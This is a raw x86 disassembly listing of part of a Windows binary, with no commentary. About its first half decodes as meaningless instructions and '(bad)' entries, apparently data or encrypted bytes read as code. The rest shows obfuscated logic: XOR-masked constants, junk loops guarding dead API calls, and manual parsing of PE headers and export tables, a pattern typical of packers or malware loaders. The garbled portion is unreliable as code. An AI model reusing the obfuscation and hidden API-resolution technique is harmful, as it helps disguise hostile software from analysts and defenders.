  4046a4:	imul   ebp,DWORD PTR [ebx-0x4b],0x44
  4046a8:	test   DWORD PTR [ecx-0x6d5ce005],0x78ad3ce7
  4046b2:	add    BYTE PTR [edi+0x6b9c83c6],dh
  4046b8:	enter  0xd6c1,0xef
  4046bc:	loope  0x40471c
  4046be:	repnz shl BYTE PTR [ebx+0x4e60848],1
  4046c5:	in     al,dx
  4046c6:	dec    ebp
  4046c7:	stos   DWORD PTR es:[edi],eax
  4046c8:	jmp    0x3561d62a
  4046cd:	mul    edi
  4046cf:	nop
  4046d0:	mov    bh,0x8c
  4046d2:	mov    cl,ah
  4046d4:	or     al,0x89
  4046d6:	loopne 0x404720
  4046d8:	aad    0x5
  4046da:	jb     0x404742
  4046dc:	mov    edi,?
  4046de:	cdq    
  4046df:	push   ecx
  4046e0:	not    DWORD PTR [ebx+0x488622e5]
  4046e6:	xor    BYTE PTR [ebx],0x52
  4046e9:	fs int 0x99
  4046ec:	or     al,0x61
  4046ee:	popf   
  4046ef:	jl     0x4046be
  4046f1:	jb     0x40471e
  4046f3:	std    
  4046f4:	push   ds
  4046f5:	cmp    BYTE PTR [edi-0x7],0x31
  4046f9:	mov    dh,0xf5
  4046fb:	cmp    BYTE PTR [ebp+0x6b],al
  4046fe:	xor    eax,0x872bb078
  404703:	ja     0x4046b2
  404705:	stc    
  404706:	push   cs
  404707:	out    dx,al
  404708:	test   al,0xe4
  40470a:	jmp    0x5cd5:0x66e267b9
  404711:	xor    DWORD PTR [esi+0x7d51706a],esi
  404717:	and    DWORD PTR [ebp-0x54],0xb6fc0f2a
  40471e:	push   esp
  40471f:	mov    esp,0xf5b411ed
  404724:	push   es
  404725:	xchg   esp,eax
  404726:	adc    DWORD PTR [esp+edx*8-0x241e214c],ebx
  40472d:	sahf   
  40472e:	and    al,BYTE PTR [edi+0x62]
  404731:	push   esp
  404732:	ret    
  404733:	popf   
  404734:	jg     0x4047a4
  404736:	ja     0x4046ee
  404738:	sahf   
  404739:	jns    0x4047b4
  40473b:	dec    eax
  40473c:	cli    
  40473d:	cmp    ebp,DWORD PTR [ebx+0x7e]
  404740:	inc    edx
  404741:	dec    edi
  404742:	out    0xf9,eax
  404744:	repnz sbb eax,0xe620e3c2
  40474a:	and    al,0xfe
  40474c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40474d:	ror    DWORD PTR [eax],1
  40474f:	cmp    al,0x2
  404751:	(bad)  
  404752:	push   edx
  404753:	jmp    0x483c:0x4df9537d
  40475a:	or     ch,bl
  40475c:	inc    edi
  40475d:	dec    BYTE PTR [ebx+0x5a]
  404760:	mov    ebp,0x18569d35
  404765:	cli    
  404766:	xor    DWORD PTR [edi],esp
  404768:	pusha  
  404769:	xor    BYTE PTR [ebp-0x5d7835e7],bh
  40476f:	mov    BYTE PTR [ecx],dh
  404771:	xor    al,0x97
  404773:	aam    0x32
  404775:	ror    BYTE PTR [ecx+0x36d15ee4],0x66
  40477c:	loope  0x4047a6
  40477e:	sbb    BYTE PTR [eax+0x5d],al
  404781:	rcl    BYTE PTR [ecx],1
  404783:	sbb    al,0x7a
  404785:	or     DWORD PTR [esp+edx*1-0x7ee3c270],0xffffffbc
  40478d:	retf   0xc2b4
  404790:	and    eax,0x3d4742a2
  404795:	push   edx
  404796:	fsubr  st,st(7)
  404798:	jecxz  0x40476e
  40479a:	cs push ss
  40479c:	adc    bl,BYTE PTR [edi+esi*8+0x34769229]
  4047a3:	lea    ebx,[esi]
  4047a5:	xor    ebp,ebx
  4047a7:	xor    ah,BYTE PTR [ecx-0x4d33d8b5]
  4047ad:	aaa    
  4047ae:	jo     0x4047b6
  4047b0:	add    bl,BYTE PTR ds:0x5f96a1fa
  4047b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047b7:	xchg   DWORD PTR [edi-0x49596c75],ebp
  4047bd:	adc    bh,al
  4047bf:	jl     0x4047ae
  4047c1:	mov    dl,0x77
  4047c3:	add    DWORD PTR [eax+0x204f1772],ebx
  4047c9:	mov    ds:0x3ff60af6,eax
  4047ce:	xchg   BYTE PTR [edx+0x15],dh
  4047d1:	adc    eax,0x729a59c7
  4047d6:	pop    ds
  4047d7:	push   ss
  4047d8:	adc    BYTE PTR [esi-0xbddc752],dh
  4047de:	stos   BYTE PTR es:[edi],al
  4047df:	mov    edx,0x3db65c7
  4047e4:	retf   0xb576
  4047e7:	and    al,0x49
  4047e9:	jge    0x404773
  4047eb:	jg     0x40478f
  4047ed:	leave  
  4047ee:	cld    
  4047ef:	and    eax,0xad328f7a
  4047f4:	jne    0x40477a
  4047f6:	add    eax,0x7b764719
  4047fb:	leave  
  4047fc:	lahf   
  4047fd:	fadd   QWORD PTR ds:0x118c1609
  404803:	adc    ch,BYTE PTR [edx]
  404805:	mov    gs,ebx
  404807:	mov    ds:0x1c2eb1eb,al
  40480c:	and    eax,0xd63fb033
  404811:	inc    edi
  404812:	(bad)  
  404813:	push   ds
  404814:	and    al,0x4e
  404816:	or     al,0xa5
  404818:	jo     0x40487f
  40481a:	add    eax,0x56b0dca4
  40481f:	add    edi,esi
  404821:	push   es
  404822:	sub    ah,dh
  404824:	int3   
  404825:	sti    
  404826:	sbb    bh,BYTE PTR ds:0x97f5b67e
  40482c:	cmp    ah,BYTE PTR ds:0xd5ba4e9d
  404832:	jle    0x40482f
  404834:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404835:	fstp   TBYTE PTR cs:[ebx-0x4d]
  404839:	xchg   edi,eax
  40483a:	lods   eax,DWORD PTR ds:[esi]
  40483b:	inc    eax
  40483c:	hlt    
  40483d:	(bad)  
  40483e:	sbb    DWORD PTR [ebp+0x3],eax
  404841:	or     al,0x67
  404843:	aas    
  404844:	mov    bh,0xd4
  404846:	imul   ecx,DWORD PTR [eax],0x29
  404849:	mov    edi,DWORD PTR [eax]
  40484b:	jmp    0x8f19:0x76023e4f
  404852:	cwde   
  404853:	xor    esp,DWORD PTR [edx+eax*4+0x1d]
  404857:	icebp  
  404858:	jb     0x4047f4
  40485a:	dec    esp
  40485b:	cwde   
  40485c:	fs push edx
  40485e:	sbb    DWORD PTR [esi],edi
  404860:	mov    ebx,0x4636b95c
  404865:	xchg   esp,eax
  404866:	(bad)  
  404867:	lahf   
  404868:	enter  0xa718,0x1f
  40486c:	sahf   
  40486d:	mov    DWORD PTR [ebp+0x34f805fd],esi
  404873:	(bad)  
  404874:	fdiv   st(0),st
  404876:	xchg   BYTE PTR [ecx],bl
  404878:	outs   dx,DWORD PTR ds:[esi]
  404879:	dec    eax
  40487a:	shl    edi,1
  40487c:	mov    dl,0x2f
  40487e:	sbb    DWORD PTR [ebx],edi
  404880:	or     esi,ebp
  404882:	dec    edi
  404883:	pushf  
  404884:	jmp    0x404835
  404886:	xchg   cl,bl
  404888:	pusha  
  404889:	jge    0x40482c
  40488b:	xchg   BYTE PTR [ebx-0x5d],ah
  40488e:	jne    0x4048b6
  404890:	xchg   DWORD PTR [eax+0x1a],esi
  404893:	mov    bh,0xe7
  404895:	mov    esp,0x90bdf657
  40489a:	mov    BYTE PTR [edi],ch
  40489c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40489d:	xchg   esp,eax
  40489e:	out    0xd3,al
  4048a0:	aaa    
  4048a1:	sbb    DWORD PTR [ebp-0x59],eax
  4048a4:	ja     0x4048a6
  4048a6:	xor    al,BYTE PTR ds:[ecx+0x41c45c30]
  4048ad:	adc    ebp,esp
  4048af:	(bad)  [eax-0x7c]
  4048b2:	ins    BYTE PTR es:[edi],dx
  4048b3:	imul   esi,DWORD PTR [esi+0x31cd42d8],0x101befa2
  4048bd:	mov    bh,0x57
  4048bf:	into   
  4048c0:	fbstp  TBYTE PTR [ebx+edi*2+0x11fc441c]
  4048c7:	cmp    al,0x1e
  4048c9:	pushf  
  4048ca:	repnz push edi
  4048cc:	out    0x5,al
  4048ce:	loope  0x4048c1
  4048d0:	mov    esp,0x6a09da46
  4048d5:	sbb    BYTE PTR [esi-0x1a62db96],ah
  4048db:	stos   BYTE PTR es:[edi],al
  4048dc:	not    dl
  4048de:	add    esi,esp
  4048e0:	adc    al,0xa7
  4048e2:	pop    esi
  4048e3:	mov    ebp,0xc75689c5
  4048e8:	rcr    dh,1
  4048ea:	(bad)  
  4048eb:	clc    
  4048ec:	daa    
  4048ed:	dec    ebx
  4048ee:	xchg   DWORD PTR ss:[edx],esi
  4048f1:	pop    eax
  4048f2:	dec    edi
  4048f3:	xchg   edi,eax
  4048f4:	mov    ebp,0x9c8285cd
  4048f9:	sub    DWORD PTR [ebx+0x59217b5],ebx
  4048ff:	sbb    bl,ah
  404901:	popa   
  404902:	outs   dx,DWORD PTR ds:[esi]
  404903:	or     DWORD PTR [ebp+0x12a69fb3],0xaa6e55cc
  40490d:	or     ebx,DWORD PTR [eax]
  40490f:	xchg   ecx,eax
  404910:	sar    BYTE PTR [esi],1
  404912:	sub    bl,BYTE PTR [edi-0x5b]
  404915:	add    eax,0xce2f4f7d
  40491a:	mov    ch,0x77
  40491c:	and    BYTE PTR [ebx+0x34],al
  40491f:	dec    esp
  404920:	pop    ebx
  404921:	dec    esp
  404922:	repnz das 
  404924:	cmp    DWORD PTR [eax],ecx
  404926:	mov    esp,0x7a408a9
  40492b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40492c:	push   ebp
  40492d:	jno    0x4048d2
  40492f:	out    0x1d,al
  404931:	nop
  404932:	mov    BYTE PTR [eax],dl
  404934:	xchg   ah,bl
  404936:	ins    BYTE PTR es:[edi],dx
  404937:	cmp    BYTE PTR [edx+0x3a],0xfb
  40493b:	addr16 cdq 
  40493d:	jbe    0x404986
  40493f:	aas    
  404940:	nop    DWORD PTR [esi-0x7]
  404944:	daa    
  404945:	pop    eax
  404946:	scas   eax,DWORD PTR es:[edi]
  404947:	mov    ebx,0x620b51b5
  40494c:	push   0xd8e6b26b
  404951:	pop    edi
  404952:	adc    eax,0x4e0d14ad
  404957:	shr    BYTE PTR [eax+0x1b8d4d24],1
  40495d:	test   BYTE PTR [eax],cl
  40495f:	int3   
  404960:	mov    fs,WORD PTR [esi-0x39d141ff]
  404966:	sub    BYTE PTR ds:0xf3055b88,0x90
  40496d:	pusha  
  40496e:	js     0x4049d3
  404970:	fcomp  st(1)
  404972:	jle    0x4048f5
  404974:	ins    DWORD PTR es:[edi],dx
  404975:	xlat   BYTE PTR ds:[ebx]
  404976:	jmp    0x404985
  404978:	loopne 0x4049e6
  40497a:	inc    esp
  40497b:	jo     0x4049bd
  40497d:	sar    ah,0xb
  404980:	add    dh,BYTE PTR [edi+edx*1]
  404983:	mov    dl,BYTE PTR [eax-0x4d]
  404986:	addr16 xor eax,0x9fc8e667
  40498c:	push   edx
  40498d:	and    bl,BYTE PTR [edx]
  40498f:	cmp    dl,BYTE PTR [esi]
  404991:	inc    edx
  404992:	cmp    DWORD PTR cs:[ebx+ecx*8-0xf317eaa],ebx
  40499a:	add    BYTE PTR fs:[eax],al
  40499d:	mov    edx,0x751089b
  4049a2:	add    DWORD PTR ds:0x435018,0x3361
  4049ac:	xor    ecx,edx
  4049ae:	and    DWORD PTR ds:0x435010,0x0
  4049b8:	xor    esi,esi
  4049ba:	or     esi,DWORD PTR ds:0x435010
  4049c0:	inc    esi
  4049c1:	mov    DWORD PTR ds:0x435010,esi
  4049c7:	cmp    DWORD PTR ds:0x435010,0xb
  4049ce:	jl     0x404a0b
  4049d4:	jmp    0x4049e4
  4049d9:	push   0x1955
  4049de:	call   DWORD PTR ds:0x43a8c4
  4049e4:	cmp    DWORD PTR ds:0x435010,0xa
  4049eb:	jne    0x4049fe
  4049f1:	mov    esi,DWORD PTR ds:0x435010
  4049f7:	inc    esi
  4049f8:	mov    DWORD PTR ds:0x435010,esi
  4049fe:	cmp    DWORD PTR ds:0x435010,0x1c
  404a05:	jb     0x4049b8
  404a0b:	mov    esi,0x3272e2
  404a10:	or     DWORD PTR ds:0x436018,0x436014
  404a1a:	push   edi
  404a1b:	add    edi,DWORD PTR ds:0x43800c
  404a21:	mov    edi,DWORD PTR [ebp+0x10]
  404a24:	add    ecx,esi
  404a26:	mov    DWORD PTR ds:0x43500c,0x38f3
  404a30:	cmp    ecx,edi
  404a32:	mov    DWORD PTR ds:0x43401c,0x3286
  404a3c:	je     0x404b8f
  404a42:	mov    ecx,DWORD PTR [ebp-0x4]
  404a45:	sbb    edi,DWORD PTR ds:0x435014
  404a4b:	mov    edi,DWORD PTR [ebp+0x10]
  404a4e:	xor    eax,eax
  404a50:	xor    DWORD PTR ds:0x435018,0x434028
  404a5a:	xor    ecx,edx
  404a5c:	add    ecx,esi
  404a5e:	mov    DWORD PTR ds:0x434024,0x7740
  404a68:	add    edi,0xfabdbee7
  404a6e:	adc    eax,0xffffffff
  404a71:	inc    DWORD PTR ds:0x437010
  404a77:	xor    eax,0x0
  404a7a:	or     DWORD PTR ds:0x438008,0x434024
  404a84:	mov    DWORD PTR [ebp-0xc],eax
  404a87:	push   ebx
  404a88:	xor    ebx,ebx
  404a8a:	adc    DWORD PTR ds:0x43400c,0x682
  404a94:	xor    edi,0x8a29a12d
  404a9a:	mov    DWORD PTR ds:0x436008,0x12
  404aa4:	cmp    DWORD PTR ds:0x436008,0x0
  404aab:	je     0x404af4
  404ab1:	cmp    DWORD PTR ds:0x436008,0x3
  404ab8:	jle    0x404af4
  404abe:	jmp    0x404acc
  404ac3:	push   DWORD PTR [ebp-0x18]
  404ac6:	call   DWORD PTR ds:0x43a8c8
  404acc:	cmp    DWORD PTR ds:0x436008,0x4
  404ad3:	jne    0x404ae4
  404ad9:	mov    eax,ds:0x436008
  404ade:	dec    eax
  404adf:	mov    ds:0x436008,eax
  404ae4:	mov    eax,ds:0x436008
  404ae9:	dec    eax
  404aea:	mov    ds:0x436008,eax
  404aef:	jmp    0x404aa4
  404af4:	mov    eax,ecx
  404af6:	add    eax,0xfabdbee7
  404afb:	adc    ebx,0xffffffff
  404afe:	xor    eax,0x8a29a12d
  404b03:	xor    ebx,0x0
  404b06:	cmp    eax,edi
  404b08:	jne    0x404b21
  404b0e:	cmp    ebx,DWORD PTR [ebp-0xc]
  404b11:	je     0x404b89
  404b17:	jmp    0x404b21
  404b1c:	mov    esi,0x3272e2
  404b21:	mov    eax,DWORD PTR [ebp-0x4]
  404b24:	mov    edi,DWORD PTR [ebp-0x8]
  404b27:	xor    edi,edx
  404b29:	add    edi,esi
  404b2b:	mov    esi,DWORD PTR [ebp+0x8]
  404b2e:	imul   edi,ecx
  404b31:	mov    ebx,DWORD PTR [ebp+0xc]
  404b34:	xor    eax,edx
  404b36:	add    eax,ecx
  404b38:	mov    al,BYTE PTR [ebx+eax*1+0x3272e2]
  404b3f:	mov    BYTE PTR [edi+esi*1],al
  404b42:	mov    eax,DWORD PTR [ebp-0x8]
  404b45:	mov    esi,DWORD PTR [ebp+0x10]
  404b48:	xor    eax,edx
  404b4a:	xor    ebx,ebx
  404b4c:	add    esi,0xfabdbee7
  404b52:	adc    ebx,0xffffffff
  404b55:	lea    ecx,[ecx+eax*1+0x3272e2]
  404b5c:	xor    edi,edi
  404b5e:	xor    esi,0x8a29a12d
  404b64:	xor    ebx,0x0
  404b67:	mov    eax,ecx
  404b69:	add    eax,0xfabdbee7
  404b6e:	adc    edi,0xffffffff
  404b71:	xor    eax,0x8a29a12d
  404b76:	xor    edi,0x0
  404b79:	cmp    eax,esi
  404b7b:	jne    0x404b1c
  404b81:	cmp    edi,ebx
  404b83:	jne    0x404b1c
  404b89:	mov    eax,0xf89c8584
  404b8e:	pop    ebx
  404b8f:	pop    edi
  404b90:	pop    esi
  404b91:	leave  
  404b92:	ret    0xc
  404b95:	push   ebp
  404b96:	mov    ebp,esp
  404b98:	push   ecx
  404b99:	add    DWORD PTR ds:0x43701c,0x56ef
  404ba3:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  404baa:	mov    eax,DWORD PTR [ebp+0x8]
  404bad:	movsx  eax,BYTE PTR [eax]
  404bb0:	and    DWORD PTR ds:0x436004,0x0
  404bba:	mov    ecx,DWORD PTR ds:0x436004
  404bc0:	inc    ecx
  404bc1:	mov    DWORD PTR ds:0x436004,ecx
  404bc7:	cmp    DWORD PTR ds:0x436004,0x6
  404bce:	ja     0x404c0b
  404bd4:	jmp    0x404be4
  404bd9:	push   0x43a0c9
  404bde:	call   DWORD PTR ds:0x43a8d0
  404be4:	cmp    DWORD PTR ds:0x436004,0x5
  404beb:	jne    0x404bfe
  404bf1:	mov    ecx,DWORD PTR ds:0x436004
  404bf7:	inc    ecx
  404bf8:	mov    DWORD PTR ds:0x436004,ecx
  404bfe:	cmp    DWORD PTR ds:0x436004,0x18
  404c05:	jb     0x404bba
  404c0b:	mov    edx,0x3272e2
  404c10:	neg    ecx
  404c12:	sub    eax,edx
  404c14:	mov    ecx,0x751089b
  404c19:	xor    eax,ecx
  404c1b:	mov    DWORD PTR ds:0x43600c,0x18ff
  404c25:	cmp    eax,0xf89c85f0
  404c2a:	jne    0x404c59
  404c30:	mov    eax,DWORD PTR [ebp+0x8]
  404c33:	push   esi
  404c34:	mov    esi,DWORD PTR [ebp+0x8]
  404c37:	add    esi,DWORD PTR [eax+0x3c]
  404c3a:	mov    DWORD PTR [ebp+0x8],esi
  404c3d:	mov    eax,DWORD PTR [ebp-0x4]
  404c40:	mov    esi,DWORD PTR [ebp+0x8]
  404c43:	xor    eax,ecx
  404c45:	add    eax,edx
  404c47:	cmp    DWORD PTR [esi+0x54],eax
  404c4a:	pop    esi
  404c4b:	je     0x404c59
  404c51:	mov    eax,DWORD PTR [ebp+0x8]
  404c54:	jmp    0x404c60
  404c59:	mov    eax,DWORD PTR [ebp-0x4]
  404c5c:	xor    eax,ecx
  404c5e:	add    eax,edx
  404c60:	leave  
  404c61:	ret    0x4
  404c64:	push   ebp
  404c65:	mov    ebp,esp
  404c67:	sub    esp,0x38
  404c6a:	or     DWORD PTR ds:0x43500c,0x434024
  404c74:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  404c7b:	mov    eax,ds:0x437004
  404c80:	or     DWORD PTR ds:0x434004,eax
  404c86:	push   ebx
  404c87:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  404c8e:	adc    DWORD PTR ds:0x434020,edi
  404c94:	mov    eax,DWORD PTR [ebp-0x4]
  404c97:	xor    DWORD PTR ds:0x437018,0x773f
  404ca1:	push   esi
  404ca2:	xor    DWORD PTR ds:0x435010,0x4a66
  404cac:	mov    esi,0x751089b
  404cb1:	and    DWORD PTR ds:0x435018,0x354c
  404cbb:	xor    eax,esi
  404cbd:	not    DWORD PTR ds:0x436018
  404cc3:	push   edi
  404cc4:	mov    edi,0x3272e2
  404cc9:	add    eax,edi
  404ccb:	xor    DWORD PTR ds:0x434018,0x434000
  404cd5:	mov    DWORD PTR [ebp-0x1c],eax
  404cd8:	and    DWORD PTR ds:0x438010,0x0
  404ce2:	mov    eax,ds:0x438010
  404ce7:	inc    eax
  404ce8:	mov    ds:0x438010,eax
  404ced:	cmp    DWORD PTR ds:0x438010,0xb
  404cf4:	jb     0x404d2f
  404cfa:	jmp    0x404d0a
  404cff:	push   0x43a097
  404d04:	call   DWORD PTR ds:0x43a8d4
  404d0a:	cmp    DWORD PTR ds:0x438010,0xa
  404d11:	jne    0x404d22
  404d17:	mov    eax,ds:0x438010
  404d1c:	inc    eax
  404d1d:	mov    ds:0x438010,eax
  404d22:	cmp    DWORD PTR ds:0x438010,0x14
  404d29:	jb     0x404ce2
  404d2f:	mov    eax,DWORD PTR [ebp+0x14]
  404d32:	sbb    DWORD PTR ds:0x437008,0x2430
  404d3c:	test   eax,eax
  404d3e:	je     0x404d99
  404d44:	and    DWORD PTR ds:0x438000,edx
  404d4a:	mov    eax,DWORD PTR [ebp+0x14]
  404d4d:	and    DWORD PTR ds:0x435014,0x0
  404d57:	xor    ebx,ebx
  404d59:	add    ebx,DWORD PTR ds:0x435014
  404d5f:	inc    ebx
  404d60:	mov    DWORD PTR ds:0x435014,ebx
  404d66:	cmp    DWORD PTR ds:0x435014,0x29
  404d6d:	jl     0x404d8e
  404d73:	jmp    0x404d81
  404d78:	push   DWORD PTR [ebp-0x24]
  404d7b:	call   DWORD PTR ds:0x43a8dc
  404d81:	cmp    DWORD PTR ds:0x435014,0x1a
  404d88:	jb     0x404d57
  404d8e:	mov    eax,DWORD PTR [eax]
  404d90:	or     ebx,DWORD PTR ds:0x438014
  404d96:	mov    DWORD PTR [ebp-0x1c],eax
  404d99:	or     DWORD PTR ds:0x436008,0x1828
  404da3:	mov    eax,DWORD PTR [ebp-0x4]
  404da6:	adc    DWORD PTR ds:0x437014,edi
  404dac:	xor    eax,esi
  404dae:	xor    ebx,ebx
  404db0:	or     ebx,DWORD PTR ds:0x436018
  404db6:	xor    DWORD PTR ds:0x434004,ebx
  404dbc:	add    eax,edi
  404dbe:	mov    DWORD PTR [ebp-0x8],eax
  404dc1:	add    DWORD PTR ds:0x43601c,0x710e
  404dcb:	mov    eax,DWORD PTR [ebp-0xc]
  404dce:	xor    ebx,ebx
  404dd0:	add    ebx,DWORD PTR ds:0x438008
  404dd6:	and    DWORD PTR ds:0x438018,ebx
  404ddc:	xor    eax,esi
  404dde:	and    DWORD PTR ds:0x438010,0x0
  404de8:	xor    ebx,ebx
  404dea:	add    ebx,DWORD PTR ds:0x438010
  404df0:	inc    ebx
  404df1:	mov    DWORD PTR ds:0x438010,ebx
  404df7:	cmp    DWORD PTR ds:0x438010,0x29
  404dfe:	jg     0x404e2c
  404e04:	jmp    0x404e1f
  404e09:	push   0x43a097
  404e0e:	push   DWORD PTR [ebp-0x24]
  404e11:	push   0x5041
  404e16:	push   DWORD PTR [ebp-0x1c]
  404e19:	call   DWORD PTR ds:0x43a8e0
  404e1f:	cmp    DWORD PTR ds:0x438010,0x1d
  404e26:	jb     0x404de8
  404e2c:	add    eax,edi
  404e2e:	movzx  ebx,WORD PTR ds:0x434018
  404e35:	sbb    ebx,DWORD PTR ds:0x434000
  404e3b:	mov    DWORD PTR ds:0x434018,ebx
  404e41:	mov    DWORD PTR [ebp-0x24],eax
  404e44:	mov    eax,DWORD PTR [ebp-0x4]
  404e47:	and    DWORD PTR ds:0x437004,edx
  404e4d:	xor    eax,esi
  404e4f:	add    eax,edi
  404e51:	add    DWORD PTR ds:0x43600c,0x546e
  404e5b:	mov    DWORD PTR [ebp-0x30],eax
  404e5e:	sub    eax,ebx
  404e60:	mov    ebx,DWORD PTR [ebp-0x4]
  404e63:	sub    DWORD PTR ds:0x435008,0x4ecf
  404e6d:	xor    ebx,esi
  404e6f:	sub    DWORD PTR ds:0x436004,edx
  404e75:	add    ebx,edi
  404e77:	adc    DWORD PTR ds:0x438000,0x4ed2
  404e81:	mov    eax,DWORD PTR [ebp-0x24]
  404e84:	xor    DWORD PTR ds:0x435018,0x43700c
  404e8e:	sub    eax,edi
  404e90:	lea    ecx,[ebx-0x3272e2]
  404e96:	xor    eax,esi
  404e98:	adc    DWORD PTR ds:0x436010,0x436014
  404ea2:	xor    ecx,esi
  404ea4:	mov    DWORD PTR ds:0x438004,0x37e0
  404eae:	cmp    ecx,eax
  404eb0:	mov    DWORD PTR ds:0x437000,0x70b7
  404eba:	je     0x4051ec
  404ec0:	and    DWORD PTR ds:0x43701c,0x0
  404eca:	xor    eax,eax
  404ecc:	or     eax,DWORD PTR ds:0x43701c
  404ed2:	inc    eax
  404ed3:	mov    ds:0x43701c,eax
  404ed8:	cmp    DWORD PTR ds:0x43701c,0x6
  404edf:	ja     0x404f2d
  404ee5:	jmp    0x404f08
  404eea:	push   DWORD PTR [ebp-0xc]
  404eed:	push   0x434024
  404ef2:	push   DWORD PTR [ebp-0x10]
  404ef5:	push   0x43a000
  404efa:	push   0x794f
  404eff:	push   DWORD PTR [ebp-0x28]
  404f02:	call   DWORD PTR ds:0x43a8e4
  404f08:	cmp    DWORD PTR ds:0x43701c,0x5
  404f0f:	jne    0x404f20
  404f15:	mov    eax,ds:0x43701c
  404f1a:	inc    eax
  404f1b:	mov    ds:0x43701c,eax
  404f20:	cmp    DWORD PTR ds:0x43701c,0x10
  404f27:	jb     0x404eca
  404f2d:	mov    eax,DWORD PTR [ebp-0x4]
  404f30:	xor    eax,esi
  404f32:	sub    DWORD PTR ds:0x435000,0x434020
  404f3c:	add    eax,edi
  404f3e:	cmp    ebx,eax
  404f40:	jne    0x4051c9
  404f46:	adc    DWORD PTR ds:0x437008,0x435000
  404f50:	push   DWORD PTR [ebp+0x8]
  404f53:	adc    DWORD PTR ds:0x43600c,0x30f1
  404f5d:	call   0x404b95
  404f62:	mov    ecx,DWORD PTR ds:0x437010
  404f68:	sub    DWORD PTR ds:0x434024,ecx
  404f6e:	mov    DWORD PTR [ebp-0x14],eax
  404f71:	and    DWORD PTR ds:0x437014,0x0
  404f7b:	mov    eax,ds:0x437014
  404f80:	inc    eax
  404f81:	mov    ds:0x437014,eax
  404f86:	cmp    DWORD PTR ds:0x437014,0x5
  404f8d:	jl     0x404fd1
  404f93:	jmp    0x404fac
  404f98:	push   DWORD PTR [ebp-0x1c]
  404f9b:	push   0x89c7
  404fa0:	push   DWORD PTR [ebp-0x20]
  404fa3:	push   DWORD PTR [ebp-0x28]
  404fa6:	call   DWORD PTR ds:0x43a8e8
  404fac:	cmp    DWORD PTR ds:0x437014,0x4
  404fb3:	jne    0x404fc4
  404fb9:	mov    eax,ds:0x437014
  404fbe:	inc    eax
  404fbf:	mov    ds:0x437014,eax
  404fc4:	cmp    DWORD PTR ds:0x437014,0x1b
  404fcb:	jb     0x404f7b
  404fd1:	mov    eax,DWORD PTR [ebp-0x4]
  404fd4:	add    ecx,0x29bc
  404fda:	mov    ecx,DWORD PTR [ebp-0x14]
  404fdd:	or     DWORD PTR ds:0x43401c,0x7fb4
  404fe7:	xor    eax,esi
  404fe9:	add    eax,edi
  404feb:	cmp    ecx,eax
  404fed:	je     0x405257
  404ff3:	push   DWORD PTR [ebp-0x14]
  404ff6:	and    DWORD PTR ds:0x438000,0x39ab
  405000:	push   DWORD PTR [ebp+0x8]
  405003:	xor    DWORD PTR ds:0x437010,0x438000
  40500d:	call   0x40a3b2
  405012:	sbb    DWORD PTR ds:0x438014,0x3483
  40501c:	mov    DWORD PTR [ebp-0x14],eax
  40501f:	or     ecx,0x551e
  405025:	mov    eax,DWORD PTR [ebp-0x4]
  405028:	mov    ecx,DWORD PTR ds:0x434010
  40502e:	or     DWORD PTR ds:0x437014,ecx
  405034:	mov    ecx,DWORD PTR [ebp-0x14]
  405037:	sub    DWORD PTR ds:0x43801c,0xa60
  405041:	xor    eax,esi
  405043:	add    eax,edi
  405045:	mov    DWORD PTR ds:0x435004,0x1802
  40504f:	cmp    ecx,eax
  405051:	je     0x405257
  405057:	mov    DWORD PTR ds:0x43701c,0x15
  405061:	cmp    DWORD PTR ds:0x43701c,0x0
  405068:	je     0x4050b4
  40506e:	cmp    DWORD PTR ds:0x43701c,0xa
  405075:	jb     0x4050b4
  40507b:	jmp    0x405086
  405080:	call   DWORD PTR ds:0x43a8f0
  405086:	cmp    DWORD PTR ds:0x43701c,0xb
  40508d:	jne    0x4050a0
  405093:	mov    ecx,DWORD PTR ds:0x43701c
  405099:	dec    ecx
  40509a:	mov    DWORD PTR ds:0x43701c,ecx
  4050a0:	xor    ecx,ecx
  4050a2:	or     ecx,DWORD PTR ds:0x43701c
  4050a8:	dec    ecx
  4050a9:	mov    DWORD PTR ds:0x43701c,ecx
  4050af:	jmp    0x405061
  4050b4:	mov    eax,DWORD PTR [ebp-0x14]
  4050b7:	sub    DWORD PTR ds:0x436010,edi
  4050bd:	mov    eax,DWORD PTR [eax+0x18]
  4050c0:	adc    DWORD PTR ds:0x436000,ebx
  4050c6:	mov    DWORD PTR [ebp-0x24],eax
  4050c9:	mov    DWORD PTR ds:0x434028,0x1f
  4050d3:	cmp    DWORD PTR ds:0x434028,0x0
  4050da:	je     0x40510b
  4050e0:	cmp    DWORD PTR ds:0x434028,0x27
  4050e7:	jl     0x40510b
  4050ed:	jmp    0x4050fb
  4050f2:	push   DWORD PTR [ebp-0x14]
  4050f5:	call   DWORD PTR ds:0x43a8f4
  4050fb:	mov    eax,ds:0x434028
  405100:	dec    eax
  405101:	mov    ds:0x434028,eax
  405106:	jmp    0x4050d3
  40510b:	mov    eax,DWORD PTR [ebp-0x14]
  40510e:	or     ecx,0x2a6b
  405114:	mov    ecx,DWORD PTR [ebp+0x8]
  405117:	xor    DWORD PTR ds:0x438000,0x69f8
  405121:	add    ecx,DWORD PTR [eax+0x20]
  405124:	sbb    DWORD PTR ds:0x436014,0x3915
  40512e:	mov    DWORD PTR [ebp-0x2c],ecx
  405131:	mov    eax,DWORD PTR [ebp-0x14]
  405134:	mov    ecx,DWORD PTR ds:0x43700c
  40513a:	xor    DWORD PTR ds:0x434008,ecx
  405140:	mov    ecx,DWORD PTR [ebp+0x8]
  405143:	add    ecx,DWORD PTR [eax+0x24]
  405146:	xor    eax,eax
  405148:	add    eax,DWORD PTR ds:0x434008
  40514e:	xor    DWORD PTR ds:0x437014,eax
  405154:	mov    DWORD PTR [ebp-0x34],ecx
  405157:	mov    DWORD PTR ds:0x438000,0x1b
  405161:	cmp    DWORD PTR ds:0x438000,0x0
  405168:	je     0x4051b8
  40516e:	cmp    DWORD PTR ds:0x438000,0x3
  405175:	jbe    0x4051b8
  40517b:	jmp    0x40518c
  405180:	push   DWORD PTR [ebp-0x28]
  405183:	push   DWORD PTR [ebp-0xc]
  405186:	call   DWORD PTR ds:0x43a8f8
  40518c:	cmp    DWORD PTR ds:0x438000,0x4
  405193:	jne    0x4051a6
  405199:	mov    ecx,DWORD PTR ds:0x438000
